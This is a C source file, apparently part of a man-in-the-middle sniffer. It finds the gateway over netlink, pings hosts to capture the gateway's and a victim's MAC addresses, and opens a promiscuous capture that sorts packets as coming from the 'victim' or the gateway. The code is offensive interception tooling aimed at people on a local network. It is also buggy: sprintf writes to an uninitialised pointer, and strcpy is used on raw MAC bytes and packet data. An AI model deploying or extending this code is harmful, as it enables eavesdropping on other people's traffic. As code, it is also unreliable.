#include"sniffer.h"
extern bool debug; 
extern bool manual;
//	bool debug;
#define BUFSIZE 8192

struct route_info{
	u_int dstAddr;
	u_int srcAddr;
	u_int gateWay;
	char ifName[IF_NAMESIZE];
};

void spilt(char* str,char* delim,char* ip ,int ip_len){
        char* str_t = strdup(str);

        *ip++ = atoi(strtok(str_t,delim));

        for(int i=0; i<ip_len-1; i++ ){
                *ip++ = atoi((strtok(NULL,delim)));

        }
        free(str_t);
}

void getGatewayMAC(u_char* arg,const struct pcap_pkthdr* hp, const u_char* packet){
	sni_info* sni = (sni_info*)arg;
	ethernet_header* eth_header = (ethernet_header*)packet;
	strcpy(sni->gateway_mac,eth_header->SRC_mac);
}

void getTargetMAC(u_char* arg,const struct pcap_pkthdr* hp,const u_char* packet){
	sni_info* sni = (sni_info*)arg;
	ethernet_header* eth_header = (ethernet_header*)packet;
	strcpy(sni->target_mac,eth_header->SRC_mac);
}

int readNlSock(int sockfd,char* buf,int seqNum,int pid){
	struct nlmsghdr* nlHdr;
	int readLen = 0, msgLen = 0;

	do{
		readLen = recv(sockfd,buf,BUFSIZE - msgLen,0);
		nlHdr = (struct nlmsghdr *)buf;
		if(nlHdr->nlmsg_type == NLMSG_DONE){
			break;
		}

		buf += readLen;
		msgLen += readLen;

		if((nlHdr->nlmsg_flags & NLM_F_MULTI) == 0){
			break;
		}
	}
	while((nlHdr->nlmsg_seq != seqNum) || (nlHdr->nlmsg_pid != pid));
	return msgLen;
}
void parseRoutes(struct nlmsghdr* nlHdr,struct route_info *rtInfo,char* gateway){
	struct rtmsg* rtMsg;
	struct rtattr* rtAttr;
	int rtLen;
	char tempBuf[100];
	struct in_addr dst;
	struct in_addr gate;

	rtMsg = (struct rtmsg*)NLMSG_DATA(nlHdr);
	if((rtMsg->rtm_family != AF_INET) || (rtMsg->rtm_table != RT_TABLE_MAIN))
		return;
	rtAttr = (struct rtattr*)RTM_RTA(rtMsg);
	rtLen = RTM_PAYLOAD(nlHdr);
	for(;RTA_OK(rtAttr,rtLen);rtAttr = RTA_NEXT(rtAttr,rtLen)){
		switch(rtAttr->rta_type){
			case RTA_OIF:
				if_indextoname(*(int*)RTA_DATA(rtAttr),rtInfo->ifName);
			break;
			case RTA_GATEWAY:
				rtInfo->gateWay = *(u_int*)RTA_DATA(rtAttr);
			break;
			case RTA_PREFSRC:
				rtInfo->srcAddr = *(u_int*)RTA_DATA(rtAttr);
			break;
			case RTA_DST:
				rtInfo->dstAddr = *(u_int*)RTA_DATA(rtAttr);
			break;
		}
	}
	dst.s_addr = rtInfo->dstAddr;
	if(strstr((char*)inet_ntoa(dst),"0.0.0.0")){
		gate.s_addr = rtInfo->gateWay;
		spilt((char*)inet_ntoa(gate),".",gateway,4);
	}
	return;
}

int getGatewayIP(u_char* gateway){
	struct nlmsghdr *nlMsg;
	struct rtmsg *rtMsg;
	struct route_info* rtInfo;
	char msgBuf[BUFSIZE];

	int sockfd, len, msgSeq = 0;
	if((sockfd = socket(PF_NETLINK,SOCK_DGRAM,NETLINK_ROUTE))<0){
		perror("Socket Creation: ");
		return -1;
	}

	memset(msgBuf, 0, BUFSIZE);

	nlMsg = (struct nlmsghdr*)msgBuf;
	rtMsg = (struct rtmsg*)NLMSG_DATA(nlMsg);

	nlMsg->nlmsg_len = NLMSG_LENGTH(sizeof(struct rtmsg));
	nlMsg->nlmsg_type = RTM_GETROUTE;

	nlMsg->nlmsg_flags = NLM_F_DUMP | NLM_F_REQUEST;
	nlMsg->nlmsg_seq = msgSeq++;
	nlMsg->nlmsg_pid = getpid();

	if(send(sockfd,nlMsg,nlMsg->nlmsg_len,0)<0){
		if(debug){
			printf("Write to Socket Failed....\n");
		}
	}
	if((len = readNlSock(sockfd,msgBuf,msgSeq,getpid()))<0){
		if(debug){
			printf("Read From Socket Failed.....\n");
		}
	}
	rtInfo = (struct route_info*)malloc(sizeof(struct route_info));
	for(;NLMSG_OK((struct nlmsghdr*)msgBuf,len);
			nlMsg = NLMSG_NEXT((struct nlmsghdr*)msgBuf,len)){
		memset(rtInfo, 0, sizeof(struct route_info));
		parseRoutes(nlMsg,rtInfo,gateway);
	}
	free(rtInfo);
	close(sockfd);
	return 0;
}
int sniffer_init(sni_info* info,char* errbuf){
	struct in_addr addr_net;
	u_int tmp_mask;
	u_int tmp_net_addr;
	if(pcap_lookupnet(info->dev,&tmp_net_addr,&tmp_mask,errbuf)==-1)return FAIL;
	addr_net.s_addr = tmp_mask;
	info->mask = inet_ntoa(addr_net);
	addr_net.s_addr = tmp_net_addr;
	if(!manual){
		info->handle = pcap_open_live(info->dev,65536,0,100,errbuf);  //no promiscous mode,or can't get the gateway mac
		if(!info->handle){
			printf("%s\n",errbuf);
			return -1;
		}
		strcpy(info->filter_app,"icmp[icmptype] = icmp-echoreply");
		if(pcap_compile(info->handle,&info->filter,info->filter_app,0,*(info->net))){
			if(debug)printf("%s\n",pcap_geterr(info->handle));
			return -1;
		}
		pcap_setfilter(info->handle,&(info->filter));
	
		ping("8.8.8.8");
		pcap_dispatch(info->handle,1,getGatewayMAC,(u_char*)info);
		getAttackerInfo(info->dev,info->attacker_mac,info->attacker_ip);
		getGatewayIP(info->gateway_ip);
		char* target;
		sprintf(target,"%d.%d.%d.%d",info->target_ip[0],info->target_ip[1],
						info->target_ip[2],info->target_ip[3],10);
		ping(target);
		printf("ping start\n");
		pcap_dispatch(info->handle,1,getTargetMAC,(u_char*)info);
		printf("ping end\n");
		if(debug){
			printf("=========================================\n");
			printf("the gateway's mac is ");
			print_mac(info->gateway_mac);
			printf("the gateway's ip is ");
			print_ip(info->gateway_ip);
			printf("=========================================\n");
			printf("the attacker's mac is ");
			print_mac(info->attacker_mac);
			printf("the attacker's ip is ");
			print_ip(info->attacker_ip);
			printf("=========================================\n");
			printf("the target's mac is ");
			print_mac(info->target_mac);
			printf("the target's ip is ");
			print_ip(info->target_ip);
		}
	}

	info->handle = pcap_open_live(info->dev,65536,1,100,errbuf); // set to promiscous mode to get packet
	return 0;
}

int getPacket(u_char* arg, const struct pcap_pkthdr* hp, const u_char* packet, char* data){
	MITM_info MITM_arg = *(MITM_info*)arg;
	int time =1;
	char* dev = MITM_arg.dev;
	u_short type = EPT_IPv4;
	u_char* victim_MAC = MITM_arg.TARGET_MAC;
	u_char* victim_IP  = MITM_arg.TARGET_IP;
	u_char* gateway_MAC = MITM_arg.GATEWAY_MAC;
	u_char* gateway_IP = MITM_arg.GATEWAY_IP;
	u_char* attacker_MAC = MITM_arg.ATTACKER_MAC;

	/* get packet info */
	ethernet_header* pEther = (ethernet_header*)packet;
	ip_header* pIPv4 = (ip_header*)(packet+14);
	tcp_header* pTCP = (tcp_header*)(packet+34);
	//char* data = (char*)(packet+54);
	strcpy(data,(char*)(packet+54));
	/* get packet from victim */
	// this condition maybe mean that thist function 
	// just only care the packet which source mac is equal victim mac or gateway mac
	if(!memcmp(pEther->SRC_mac,victim_MAC,6)){  
		return FromVictim;
	//	char* p = strstr(data,"HTTP");
	//	if(p)printf("%s\n",data);
	//	forword(); //victim  -> gateway
	}else if(!memcmp(pEther->SRC_mac,gateway_MAC,6)){
		return FromGateway;
	//	forword(); //gateway -> victim
	}
}
